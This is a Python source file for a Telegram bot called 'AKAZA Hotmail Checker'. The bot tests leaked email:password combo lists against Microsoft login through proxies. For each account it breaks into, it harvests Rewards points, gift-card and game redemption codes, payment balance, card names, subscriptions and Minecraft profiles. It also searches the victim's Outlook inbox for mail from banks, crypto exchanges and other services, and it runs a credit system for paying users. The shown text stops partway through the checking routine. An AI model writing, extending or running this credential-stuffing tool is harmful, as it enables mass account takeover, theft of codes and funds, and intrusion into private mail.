import re, json, uuid, sqlite3, logging, asyncio
import time, os, random, threading, requests, urllib3
from datetime import datetime, timedelta
from pathlib import Path
from urllib.parse import quote, unquote, urlparse, parse_qs
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
from telegram import (Update, InlineKeyboardButton,
                      InlineKeyboardMarkup)
from telegram.ext import (Application, CommandHandler,
    MessageHandler, CallbackQueryHandler,
    ContextTypes, filters)

urllib3.disable_warnings()
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# SECTION 3 — CONFIG CONSTANTS
BOT_TOKEN = os.environ.get('BOT_TOKEN')
ADMIN_ID = int(os.environ.get('ADMIN_ID', '0'))
DB = os.environ.get('DB_PATH', 'checker.db')
MAX_EXECUTOR_WORKERS = 500

# flux.py login URL — DO NOT CHANGE
SFTAG_URL = (
    'https://login.live.com/oauth20_authorize.srf'
    '?client_id=00000000402B5328'
    '&redirect_uri=https://login.live.com/oauth20_desktop.srf'
    '&scope=service::user.auth.xboxlive.com::MBI_SSL'
    '&display=touch&response_type=token&locale=en'
)

# Global proxy list
PROXIES_LIST = []

# Global thread pool
bot_executor = ThreadPoolExecutor(max_workers=MAX_EXECUTOR_WORKERS)

db_lock = threading.Lock()

# SECTION 4 — AkazaDatabase CLASS
class AkazaDatabase:
    def __init__(self, db_path):
        self.db_path = db_path

    def _execute(self, query, params=(), fetchone=False, fetchall=False, commit=True):
        with db_lock:
            conn = sqlite3.connect(self.db_path)
            try:
                cursor = conn.cursor()
                cursor.execute(query, params)
                if commit:
                    conn.commit()
                if fetchone:
                    return cursor.fetchone()
                if fetchall:
                    return cursor.fetchall()
            finally:
                conn.close()

    def init_db(self):
        self._execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                first_name TEXT,
                credits INTEGER DEFAULT 0,
                has_access INTEGER DEFAULT 0,
                is_banned INTEGER DEFAULT 0,
                is_mod INTEGER DEFAULT 0,
                total_checks INTEGER DEFAULT 0,
                total_hits INTEGER DEFAULT 0,
                join_date TEXT,
                access_expiry TEXT
            )
        ''')
        self._execute('''
            CREATE TABLE IF NOT EXISTS settings (
                user_id INTEGER PRIMARY KEY,
                keywords TEXT,
                threads INTEGER DEFAULT 10,
                fast_mode INTEGER DEFAULT 0
            )
        ''')
        self._execute('''
            CREATE TABLE IF NOT EXISTS results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                email TEXT,
                status TEXT,
                details TEXT,
                date TEXT
            )
        ''')

    def add_user(self, uid, username, first_name):
        self._execute('''
            INSERT OR IGNORE INTO users (user_id, username, first_name, join_date)
            VALUES (?, ?, ?, ?)
        ''', (uid, username, first_name, datetime.now().isoformat()))
        self._execute('''
            INSERT OR IGNORE INTO settings (user_id) VALUES (?)
        ''', (uid,))

    def is_banned(self, uid):
        res = self._execute('SELECT is_banned FROM users WHERE user_id = ?', (uid,), fetchone=True)
        return bool(res[0]) if res else False

    def has_access(self, uid):
        if uid == ADMIN_ID:
            return True
        res = self._execute('SELECT has_access, access_expiry, is_banned FROM users WHERE user_id = ?', (uid,), fetchone=True)
        if not res:
            return False
        has_access, access_expiry, is_banned = res
        if is_banned:
            return False
        if not has_access:
            return False
        if access_expiry:
            try:
                if datetime.now() > datetime.fromisoformat(access_expiry):
                    return False
            except:
                return False
        return True

    def is_mod(self, uid):
        if uid == ADMIN_ID:
            return True
        res = self._execute('SELECT is_mod FROM users WHERE user_id = ?', (uid,), fetchone=True)
        return bool(res[0]) if res else False

    def add_credits(self, uid, amount):
        self._execute('UPDATE users SET credits = credits + ? WHERE user_id = ?', (amount, uid))

    def set_credits(self, uid, amount):
        self._execute('UPDATE users SET credits = ? WHERE user_id = ?', (amount, uid))

    def reset_credits(self, uid):
        self._execute('UPDATE users SET credits = 0 WHERE user_id = ?', (uid,))

    def use_credit(self, uid):
        if uid == ADMIN_ID:
            return
        self._execute('UPDATE users SET credits = MAX(0, credits - 1) WHERE user_id = ?', (uid,))

    def get_credits(self, uid):
        if uid == ADMIN_ID:
            return 999999
        res = self._execute('SELECT credits FROM users WHERE user_id = ?', (uid,), fetchone=True)
        return res[0] if res else 0

    def grant_access(self, uid):
        self._execute('UPDATE users SET has_access = 1, access_expiry = NULL WHERE user_id = ?', (uid,))

    def revoke_access(self, uid):
        self._execute('UPDATE users SET has_access = 0, access_expiry = NULL WHERE user_id = ?', (uid,))

    def grant_timed_access(self, uid, days):
        expiry = (datetime.now() + timedelta(days=days)).isoformat()
        self._execute('UPDATE users SET has_access = 1, access_expiry = ? WHERE user_id = ?', (expiry, uid))

    def ban(self, uid):
        self._execute('UPDATE users SET is_banned = 1 WHERE user_id = ?', (uid,))

    def unban(self, uid):
        self._execute('UPDATE users SET is_banned = 0 WHERE user_id = ?', (uid,))

    def set_mod(self, uid, val):
        self._execute('UPDATE users SET is_mod = ? WHERE user_id = ?', (val, uid))

    def get_all_user_ids(self) -> list:
        res = self._execute('SELECT user_id FROM users', fetchall=True)
        return [r[0] for r in res] if res else []

    def get_user_info(self, uid) -> dict:
        res = self._execute('SELECT * FROM users WHERE user_id = ?', (uid,), fetchone=True)
        if res:
            cols = ['user_id', 'username', 'first_name', 'credits', 'has_access', 'is_banned', 'is_mod', 'total_checks', 'total_hits', 'join_date', 'access_expiry']
            return dict(zip(cols, res))
        return {}

    def get_user_settings(self, uid) -> dict:
        res = self._execute('SELECT keywords, threads, fast_mode FROM settings WHERE user_id = ?', (uid,), fetchone=True)
        if res:
            kws = res[0].split(',') if res[0] else []
            return {'keywords': kws, 'threads': res[1], 'fast_mode': bool(res[2])}
        return {'keywords': [], 'threads': 10, 'fast_mode': False}

    def update_settings(self, uid, keywords=None, threads=None, fast_mode=None):
        if keywords is not None:
            self._execute('UPDATE settings SET keywords = ? WHERE user_id = ?', (','.join(keywords), uid))
        if threads is not None:
            self._execute('UPDATE settings SET threads = ? WHERE user_id = ?', (threads, uid))
        if fast_mode is not None:
            self._execute('UPDATE settings SET fast_mode = ? WHERE user_id = ?', (1 if fast_mode else 0, uid))

    def save_result(self, uid, email, status, details_dict):
        self._execute('''
            INSERT INTO results (user_id, email, status, details, date)
            VALUES (?, ?, ?, ?, ?)
        ''', (uid, email, status, json.dumps(details_dict), datetime.now().isoformat()))
        if status == 'hit':
            self._execute('UPDATE users SET total_checks = total_checks + 1, total_hits = total_hits + 1 WHERE user_id = ?', (uid,))
        else:
            self._execute('UPDATE users SET total_checks = total_checks + 1 WHERE user_id = ?', (uid,))

    def user_stats(self, uid) -> dict:
        res = self._execute('SELECT total_checks, total_hits, credits FROM users WHERE user_id = ?', (uid,), fetchone=True)
        if res:
            return {'checks': res[0], 'hits': res[1], 'credits': res[2]}
        return {'checks': 0, 'hits': 0, 'credits': 0}

    def get_global_stats(self) -> dict:
        total = self._execute('SELECT COUNT(*) FROM users', fetchone=True)[0]
        active = self._execute('SELECT COUNT(*) FROM users WHERE has_access = 1', fetchone=True)[0]
        checks = self._execute('SELECT SUM(total_checks) FROM users', fetchone=True)[0] or 0
        hits = self._execute('SELECT SUM(total_hits) FROM users', fetchone=True)[0] or 0
        return {'total': total, 'active': active, 'checks': checks, 'hits': hits}

    def list_mods(self) -> list:
        res = self._execute('SELECT user_id, username FROM users WHERE is_mod = 1', fetchall=True)
        return [{'uid': r[0], 'username': r[1]} for r in res] if res else []

akaza_db = AkazaDatabase(DB)

# SECTION 5 — SERVICE_KEYWORDS DICT
SERVICE_KEYWORDS = {
    # Social
    "instagram.com": "Instagram", "mail.instagram.com": "Instagram",
    "facebook.com": "Facebook", "facebookmail.com": "Facebook",
    "twitter.com": "Twitter", "x.com": "Twitter",
    "tiktok.com": "TikTok", "snapchat.com": "Snapchat",
    "discord.com": "Discord", "discordapp.com": "Discord",
    "telegram.org": "Telegram", "reddit.com": "Reddit",
    "linkedin.com": "LinkedIn", "twitch.tv": "Twitch",
    "onlyfans.com": "OnlyFans", "patreon.com": "Patreon",
    "vk.com": "VK", "whatsapp.com": "WhatsApp", "youtube.com": "YouTube",
    # Streaming
    "netflix.com": "Netflix", "info@netflix.com": "Netflix",
    "spotify.com": "Spotify", "disneyplus.com": "Disney+",
    "hulu.com": "Hulu", "hbo.com": "HBO", "hbomax.com": "HBO Max",
    "primevideo.com": "Amazon Prime", "apple.com": "Apple",
    "itunes.com": "Apple TV", "peacocktv.com": "Peacock",
    "paramountplus.com": "Paramount+", "tidal.com": "Tidal", "deezer.com": "Deezer",
    # Gaming
    "xbox.com": "Xbox", "playstation.com": "PlayStation", "sony.com": "PlayStation",
    "nintendo.com": "Nintendo", "steampowered.com": "Steam",
    "epicgames.com": "Epic Games", "riotgames.com": "Riot Games",
    "minecraft.net": "Minecraft", "roblox.com": "Roblox",
    "ubisoft.com": "Ubisoft", "ea.com": "EA", "blizzard.com": "Blizzard",
    "valorant.com": "Valorant", "fortnite.com": "Fortnite", "pubg.com": "PUBG",
    "callofduty.com": "Call of Duty", "rockstargames.com": "Rockstar Games",
    # Finance
    "paypal.com": "PayPal", "venmo.com": "Venmo", "cash.app": "CashApp",
    "stripe.com": "Stripe", "revolut.com": "Revolut", "wise.com": "Wise",
    "coinbase.com": "Coinbase", "binance.com": "Binance",
    "kraken.com": "Kraken", "robinhood.com": "Robinhood",
    # Shopping
    "amazon.com": "Amazon", "ebay.com": "eBay", "aliexpress.com": "AliExpress",
    "etsy.com": "Etsy", "walmart.com": "Walmart", "target.com": "Target",
    "shopify.com": "Shopify", "nike.com": "Nike", "adidas.com": "Adidas",
    # Food
    "ubereats.com": "UberEats", "doordash.com": "DoorDash",
    "grubhub.com": "Grubhub", "deliveroo.co.uk": "Deliveroo",
    # Travel
    "uber.com": "Uber", "lyft.com": "Lyft", "airbnb.com": "Airbnb",
    "booking.com": "Booking.com", "expedia.com": "Expedia",
    # Cloud
    "dropbox.com": "Dropbox", "google.com": "Google", "drive.google.com": "Google Drive",
    "microsoft.com": "Microsoft", "onedrive.com": "OneDrive", "icloud.com": "iCloud",
    # VPN
    "nordvpn.com": "NordVPN", "expressvpn.com": "ExpressVPN",
    "surfshark.com": "Surfshark", "protonvpn.com": "ProtonVPN",
    # Education
    "coursera.org": "Coursera", "udemy.com": "Udemy",
    "duolingo.com": "Duolingo", "grammarly.com": "Grammarly",
    # Productivity
    "office.com": "Office365", "zoom.us": "Zoom", "slack.com": "Slack",
    "adobe.com": "Adobe", "canva.com": "Canva"
}

def format_proxy(proxy_str):
    proxy_str = proxy_str.strip()
    if not proxy_str: return None
    if proxy_str.startswith(('http://','https://','socks')): return proxy_str
    parts = proxy_str.split(':')
    if len(parts) == 4:
        ip, port, user, pwd = parts
        return f'http://{user}:{pwd}@{ip}:{port}'
    elif len(parts) == 2:
        return f'http://{proxy_str}'
    return proxy_str

# SECTION 6 — AkazaChecker CLASS
class AkazaChecker:
    def __init__(self, proxy=None):
        self.session = requests.Session()
        self.session.verify = False
        if proxy:
            p = format_proxy(proxy)
            if p: self.session.proxies = {'http': p, 'https': p}
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0'
        })

    def get_sftag_params(self):
        for _ in range(3):
            try:
                headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','Accept-Language': 'en-US,en;q=0.9','Accept-Encoding': 'gzip, deflate, br','Connection': 'keep-alive','Upgrade-Insecure-Requests': '1'}
                text = self.session.get(SFTAG_URL, headers=headers, timeout=10, verify=False).text
                match = re.search('value=\\\\"(.+?)\\\\"', text, re.S) or re.search('value="(.+?)"', text, re.S) or re.search("sFTTag:'(.+?)'", text, re.S) or re.search('sFTTag:"(.+?)"', text, re.S) or re.search('name="PPFT".*?value="(.+?)"', text, re.S)
                if match:
                    ppft = match.group(1)
                    match = re.search('"urlPost":"(.+?)"', text, re.S) or re.search("urlPost:'(.+?)'", text, re.S) or re.search('urlPost:"(.+?)"', text, re.S) or re.search('<form.*?action="(.+?)"', text, re.S)
                    if match:
                        urlPost = match.group(1).replace('&amp;', '&')
                        return (urlPost, ppft)
            except: pass
            time.sleep(0.1)
        return (None, None)

    def do_login(self, email, password, urlPost, ppft):
        for _ in range(3):
            try:
                data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': ppft}
                headers = {'Content-Type': 'application/x-www-form-urlencoded','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
                resp = self.session.post(urlPost, data=data, headers=headers, allow_redirects=True, timeout=10, verify=False)
                if '#' in resp.url and resp.url != SFTAG_URL:
                    token = parse_qs(urlparse(resp.url).fragment).get('access_token', ['None'])[0]
                    if token != 'None': return ('TOKEN', token, self.session)
                elif 'cancel?mkt=' in resp.text:
                    try:
                        ipt = re.search(r'(?<="ipt" value=").+?(?=">)', resp.text)
                        pprid = re.search(r'(?<="pprid" value=").+?(?=">)', resp.text)
                        uaid = re.search(r'(?<="uaid" value=").+?(?=">)', resp.text)
                        if ipt and pprid and uaid:
                            form_data = {'ipt': ipt.group(), 'pprid': pprid.group(), 'uaid': uaid.group()}
                            action = re.search(r'(?<=id="fmHF" action=").+?(?=" )', resp.text)
                            if action:
                                ret = self.session.post(action.group(), data=form_data, allow_redirects=True, timeout=10, verify=False)
                                return_url = re.search(r'(?<="recoveryCancel":{"returnUrl":").+?(?=",)', ret.text)
                                if return_url:
                                    fin = self.session.get(return_url.group(), allow_redirects=True, timeout=10, verify=False)
                                    token = parse_qs(urlparse(fin.url).fragment).get('access_token', ['None'])[0]
                                    if token != 'None': return ('TOKEN', token, self.session)
                    except: pass
                    return ('2FA', None, self.session)
                elif any(val in resp.text for val in ['recover?mkt', 'account.live.com/identity/confirm?mkt', 'Email/Confirm?mkt', '/Abuse?mkt=']):
                    return ('2FA', None, self.session)
                elif any(val in resp.text.lower() for val in ['password is incorrect', "account doesn't exist", "that microsoft account doesn't exist", 'sign in to your microsoft account', 'tried to sign in too many times', 'help us protect your account']):
                    return ('BAD', None, self.session)
            except: pass
            time.sleep(0.1)
        return ('ERROR', None, self.session)

    def handle_fmhf(self, resp):
        for _ in range(5):
            if 'fmHF' not in resp.text: break
            try:
                soup = BeautifulSoup(resp.text, 'html.parser')
                form = soup.find('form', id='fmHF') or soup.find('form', attrs={'name': 'fmHF'})
                if not form or not form.has_attr('action'): break
                action = form['action']
                if action.startswith('/'): action = 'https://login.live.com' + action
                data = {inp.get('name'): inp.get('value', '') for inp in form.find_all('input') if inp.get('name')}
                resp = self.session.post(action, data=data, timeout=10, verify=False, allow_redirects=True)
            except: break
        return resp

    def get_rewards_points(self):
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0", "Referer": "https://rewards.bing.com/"}
        # Method 1
        try:
            r = self.session.get("https://rewards.bing.com/api/getuserinfo", headers=headers, timeout=8)
            if r.status_code == 200:
                data = r.json()
                points = data.get('availablePoints') or data.get('dashboard', {}).get('userStatus', {}).get('availablePoints')
                if points is not None: return int(points)
        except: pass
        # Method 2
        try:
            r = self.session.get("https://www.bing.com/rewardsapp/flyoutHub?format=json", headers=headers, timeout=8)
            if r.status_code == 200:
                data = r.json()
                points = data.get('userInfo', {}).get('balance')
                if points is not None: return int(points)
        except: pass
        # Method 3
        try:
            r = self.session.get("https://rewards.bing.com", timeout=10)
            r = self.handle_fmhf(r)
            match = re.search(r'"availablePoints"\s*:\s*(\d+)', r.text)
            if match:
                pts = int(match.group(1))
                if 0 <= pts <= 500000: return pts
        except: pass
        return 0

    def detect_category(self, title, row_text=''):
        text = (row_text + ' ' + title).lower()
        if 'overwatch' in text: return 'Overwatch'
        if any(x in text for x in ['sea of thieves', 'ancient coins']): return 'Sea of Thieves'
        if any(x in text for x in ['roblox', 'robux']): return 'Roblox'
        if any(x in text for x in ['league of legends', 'riot points']): return 'League of Legends'
        if any(x in text for x in ['game pass', 'gamepass']): return 'Game Pass'
        if any(x in text for x in ['minecraft', 'minecoins']): return 'Minecraft'
        if any(x in text for x in ['gift card', 'amazon', 'steam', 'xbox', 'nintendo', 'playstation', 'starbucks', 'walmart', 'spotify']): return 'Gift Card'
        return 'Unknown'

    def get_redemption_codes(self):
        codes = []
        try:
            url = 'https://rewards.bing.com/redeem/orderhistory'
            r = self.session.get(url, headers={'Referer': 'https://rewards.bing.com/'}, timeout=10)
            if 'fmHF' in r.text or 'JavaScript required' in r.text:
                r = self.handle_fmhf(r); r = self.session.get(url, headers={'Referer': 'https://rewards.bing.com/'}, timeout=10)
            soup = BeautifulSoup(r.text, 'html.parser')
            vt = soup.find('input', attrs={'name': '__RequestVerificationToken'})
            token = vt['value'] if vt else ''
            table = soup.find('table', class_='table')
            rows = table.find_all('tr') if table else []
            patterns = [r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b', r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b', r'\b[A-Z0-9]{4}-[A-Z0-9]{4}-[A-Z0-9]{4}\b']
            exclude = {'SWEEPSTAKES', 'STATUS', 'WINORDER', 'CONTEST', 'PLAGUE', 'REQUIEM', 'CUSTOM', 'BUNDLEORDER', 'SURFACE', 'PROORDER', 'SERIES', 'POINTS', 'DONATION', 'CHILDREN', 'RESEARCH', 'HOSPITALORDE', 'EDUCATION', 'EMPLOYMENTOR', 'RIGHTS', 'YOUORDER', 'SEDSORDER', 'ATAORDER', 'CARDORDER', 'MICROSOFT', 'PRESENTKORT', 'KRORDER', 'OFT-PRE', 'DIGITAL', 'COINSORDER', 'MOEDAS', 'OVERWATCHORD', 'MONEDASORDER', 'ASSINATURA', 'GRATUITA', 'SPOTIFY', 'PREMIUM', 'MESESORDER', 'PRESENTE', 'RESALET', 'NOURORDER', 'FOUNDATIONOR', 'YACOUB', 'LEAGUE', 'LEGENDS', 'RPORDER', 'OVERWATCH', 'GAME', 'PASS', 'MINECOINS', 'ROBUX', 'GIFT', 'CARD', 'ORDER', 'CODE', 'FOUND', 'DIGITAL-CODE', 'REDEMPTION', 'REDEEM', 'DOWNLOAD', 'INSTANT', 'DELIVERY', 'ONLINE', 'ACCESS', 'CONTENT', 'DLC', 'EXPANSION', 'SEASON', 'TOKEN', 'CURRENCY', 'VIRTUAL', 'ITEM'}
            for row in rows:
                cells = row.find_all(['td', 'th'])
                if len(cells) < 3: continue
                title = cells[2].get_text(strip=True); date = cells[1].get_text(strip=True)
                btn = row.find('button', id=lambda x: x and x.startswith('OrderDetails_'))
                if btn:
                    act = btn.get('data-actionurl', '').replace('&amp;', '&')
                    if act.startswith('/'): act = 'https://rewards.bing.com' + act
                    try:
                        cr = self.session.post(act, data={'__RequestVerificationToken': token}, timeout=10)
                        val = None
                        rs = BeautifulSoup(cr.text, 'html.parser').find('div', class_='resendSuccess')
                        if rs:
                            for k, v in zip(rs.find_all('div', class_=re.compile(r'tango-credential-key', re.I)), rs.find_all('div', class_=re.compile(r'tango-credential-value', re.I))):
                                if any(x in k.get_text(strip=True).upper() for x in ['CODE', 'PIN']):
                                    val = v.get_text(strip=True); break
                        if not val:
                            for p in patterns:
                                m = re.search(p, cr.text)
                                if m: val = m.group(); break
                        if val and '*' not in val and val.upper() not in exclude:
                            u_match = re.search(r'<a[^>]*href="([^"]*)"[^>]*>Redemption URL</a>', cr.text)
                            codes.append({'code': val, 'category': self.detect_category(title, row.get_text()), 'info': title, 'redemption_url': u_match.group(1) if u_match else "", 'date': date})
                    except: pass
                else:
                    text = cells[3].get_text(strip=True) if len(cells) > 3 else ""
                    for p in patterns:
                        m = re.search(p, text)
                        if m and m.group().upper() not in exclude:
                            codes.append({'code': m.group(), 'category': self.detect_category(title, row.get_text()), 'info': title, 'redemption_url': "", 'date': date}); break
        except: pass
        return codes

    def get_microsoft_subs(self):
        try:
            uid = uuid.uuid4().hex[:16]; state = quote(json.dumps({"userId": uid, "scopeSet":"pidl"}))
            url = f"https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https://account.microsoft.com/auth/complete-silent-delegate-auth&state={state}&prompt=none"
            r = self.session.get(url, headers={'Referer': 'https://account.microsoft.com/'}, timeout=20)
            token = re.search(r'access_token=([^&]+)', r.text + r.url)
            if not token: return {"status":"FREE","subs":[], "balance": "", "card": ""}
            pay_tk = unquote(token.group(1))
            headers = {"Authorization": f"MSADELEGATE1.0=\"{pay_tk}\"", "ms-cV": str(uuid.uuid4()), "Referer": "https://account.microsoft.com/"}
            balance = ""; card = ""
            try:
                r = self.session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US", headers=headers, timeout=15)
                if r.status_code == 200:
                    b_match = re.search(r'"balance":\s*([0-9.]+)', r.text)
                    if b_match: balance = f"${b_match.group(1)}"
                    c_match = re.search(r'"paymentMethodFamily":"credit_card".*?"name":"([^"]+)"', r.text)
                    if c_match: card = c_match.group(1)
            except: pass
            subs = []
            try:
                r = self.session.get("https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions", headers=headers, timeout=15)
                keywords = {'Xbox Game Pass Ultimate': 'GAME PASS ULTIMATE', 'PC Game Pass': 'PC GAME PASS', 'Xbox Game Pass': 'GAME PASS', 'EA Play': 'EA PLAY', 'Xbox Live Gold': 'XBOX LIVE GOLD', 'Microsoft 365 Family': 'M365 FAMILY', 'Microsoft 365 Personal': 'M365 PERSONAL', 'Office 365': 'OFFICE 365', 'OneDrive': 'ONEDRIVE'}
                for kw, name in keywords.items():
                    if kw in r.text: subs.append({"name": name, "is_expired": False})
            except: pass
            return {"status": "PREMIUM" if subs else "FREE", "subs": subs, "balance": balance, "card": card}
        except: return {"status":"FREE","subs":[], "balance": "", "card": ""}

    def get_profile(self, access_token, cid):
        try:
            h = {'Authorization': f'Bearer {access_token}', 'X-AnchorMailbox': f'CID:{cid}', 'User-Agent': 'Outlook-Android/2.0', 'Accept': 'application/json'}
            r = self.session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=h, timeout=15)
            if r.status_code == 200:
                d = r.json(); return d.get('displayName', ''), d.get('country', '') or d.get('accounts', [{}])[0].get('location', {}).get('country', '')
        except: pass
        return "", ""

    def get_minecraft(self, access_token):
        try:
            r = self.session.post("https://user.auth.xboxlive.com/user/authenticate", json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": f"d={access_token}"}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}, timeout=15)
            xbl_tk = r.json()['Token']; uhs = r.json()['DisplayClaims']['xui'][0]['uhs']
            r = self.session.post("https://xsts.auth.xboxlive.com/xsts/authorize", json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbl_tk]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}, timeout=15)
            xsts_tk = r.json()['Token']
            r = self.session.post("https://api.minecraftservices.com/authentication/login_with_xbox", json={"identityToken": f"XBL3.0 x={uhs};{xsts_tk}"}, timeout=15)
            mc_tk = r.json()['access_token']
            r = self.session.get("https://api.minecraftservices.com/minecraft/profile", headers={"Authorization": f"Bearer {mc_tk}"}, timeout=15)
            if r.status_code == 200:
                d = r.json(); return {"owned": True, "username": d['name'], "uuid": d['id'], "capes": [c.get('alias') for c in d.get('capes', [])]}
        except: pass
        return {"owned": False}

    def scan_inbox(self, access_token, cid, user_keywords):
        results = {}
        combined = list(set(list(SERVICE_KEYWORDS.keys()) + user_keywords))
        h = {'Authorization': f'Bearer {access_token}', 'X-AnchorMailbox': f'CID:{cid}', 'User-Agent': 'Outlook-Android/2.0', 'Content-Type': 'application/json', 'Accept': 'application/json'}
        for i in range(0, len(combined), 8):
            batch = combined[i:i+8]; query = " OR ".join(batch)
            payload = {"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "TimeZone": "UTC", "TextDecorations": "Off", "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"], "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]}, "From": 0, "Query": {"QueryString": query}, "Size": 5, "Sort": [{"Field": "Time", "SortDirection": "Desc"}]}]}
            try:
                r = self.session.post("https://outlook.live.com/search/api/v2/query", json=payload, headers=h, timeout=10)
                if r.status_code == 200 and r.json().get('EntitySets', [{}])[0].get('ResultSets', [{}])[0].get('Total', 0) > 0:
                    for kw in batch:
                        payload['EntityRequests'][0]['Query']['QueryString'] = kw
                        ri = self.session.post("https://outlook.live.com/search/api/v2/query", json=payload, headers=h, timeout=10)
                        if ri.status_code == 200:
                            ti = ri.json().get('EntitySets', [{}])[0].get('ResultSets', [{}])[0].get('Total', 0)
                            if ti > 0: name = SERVICE_KEYWORDS.get(kw, kw); results[name] = results.get(name, 0) + ti
            except: pass
        return results

    def check(self, email, password, user_keywords=[], fast_mode=False):
        urlPost, ppft = self.get_sftag_params()
        if not urlPost: return {'status': 'error'}
        st, tk, sess = self.do_login(email, password, urlPost, ppft)
        if st == 'BAD': return {'status': 'bad'}
        if st == '2FA': return {'status': '2fa'}
        if st == 'ERROR': return {'status': 'error'}
        cid = ''
        for cookie in self.session.cookies:
            if cookie.name == 'MSPCID': cid = cookie.value.upper(); break
        try: pts = self.get_rewards_points()
        except: pts = 0
        try: codes = self.get_redemption_codes()
        except: codes = []
        if fast_mode:
            return {'status': 'hit', 'email': email, 'password': password, 'pts': pts, 'codes': codes, 'subs': {"status":"FREE","subs":[]}, 'name': '', 'country': '', 'mc': {"owned": False}, 'inbox': {}}
        try: subs = self.get_microsoft_subs()
        except: subs = {"status":"FREE","subs":[]}
        try: name, country = self.get_profile(tk, cid)
        except: name, country = "", ""
        try: mc = self.get_minecraft(tk)
        except: mc = {"owned": False}
        try: inbox = self.scan_inbox(tk, cid, user_keywords)
        except: inbox = {}
        return {'status': 'hit', 'email': email, 'password': password, 'name': name, 'country': country, 'pts': pts, 'codes': codes, 'subs': subs, 'mc': mc, 'inbox': inbox}

# SECTION 7 — Telegram Bot Handlers
class AkazaBot:
    def __init__(self, token):
        self.app = Application.builder().token(token).build()
        self.active_tasks = {}
        self.edit_locks = {}

    async def check_user(self, update: Update):
        uid = update.effective_user.id
        akaza_db.add_user(uid, update.effective_user.username, update.effective_user.first_name)
        if akaza_db.is_banned(uid):
            await update.message.reply_text("❌ You are banned from using this bot.")
            return False
        return True

    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not await self.check_user(update): return
        uid = update.effective_user.id
        info = akaza_db.get_user_info(uid)
        cred = "Unlimited" if uid == ADMIN_ID else info['credits']
        role = "Admin" if uid == ADMIN_ID else ("Moderator" if info['is_mod'] else "User")

        msg = (
            f"💠 *AKAZA Hotmail Checker* 💠\n\n"
            f"👤 *User:* `{update.effective_user.first_name}`\n"
            f"🆔 *ID:* `{uid}`\n"
            f"🎖 *Role:* `{role}`\n"
            f"💰 *Credits:* `{cred}`\n\n"
            "📥 *Send a .txt combo (email:pass) or text to start checking.*"
        )
        kbd = [
            [InlineKeyboardButton("📊 Stats", callback_data="stats"), InlineKeyboardButton("⚙️ Settings", callback_data="settings")],
            [InlineKeyboardButton("🆘 Help", callback_data="help"), InlineKeyboardButton("📜 My Hits", callback_data="hits")]
        ]
        await update.message.reply_text(msg, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(kbd))

    async def handle_text(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not await self.check_user(update): return
        if not akaza_db.has_access(update.effective_user.id):
            await update.message.reply_text("❌ You don't have access. Contact Admin.")
            return

        text = update.message.text
        if text.startswith('!!'):
            await self.admin_cmd_handler(update, context)
            return

        lines = text.splitlines()
        combos = [l.strip() for l in lines if ':' in l]
        if combos:
            asyncio.create_task(self.process_checking(update, context, combos))
        else:
            await update.message.reply_text("❓ No valid combos found. Use `email:pass` format.")

    async def handle_document(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        if not await self.check_user(update): return
        if not akaza_db.has_access(update.effective_user.id):
            await update.message.reply_text("❌ You don't have access. Contact Admin.")
            return

        doc = update.message.document
        caption = update.message.caption or ""
        if doc.file_name.endswith('.txt'):
            file = await context.bot.get_file(doc.file_id)
            content = await file.download_as_bytearray()
            text = content.decode('utf-8', errors='ignore')

            if 'proxies' in doc.file_name.lower() or 'prox' in caption.lower():
                new_proxies = [l.strip() for l in text.splitlines() if l.strip()]
                PROXIES_LIST.clear(); PROXIES_LIST.extend(new_proxies)
                await update.message.reply_text(f"✅ Loaded {len(new_proxies)} proxies.")
            else:
                combos = [l.strip() for l in text.splitlines() if ':' in l]
                if combos:
                    asyncio.create_task(self.process_checking(update, context, combos))
                else:
                    await update.message.reply_text("❓ No valid combos found in file.")

    async def process_checking(self, update: Update, context: ContextTypes.DEFAULT_TYPE, combos):
        uid = update.effective_user.id
        settings = akaza_db.get_user_settings(uid)
        limit = asyncio.Semaphore(settings['threads'])

        total = len(combos)
        hits, bad, twofa, err = 0, 0, 0, 0
        checked = 0
        last_hits = []

        status_msg = await update.message.reply_text("🚀 Initializing checker...")
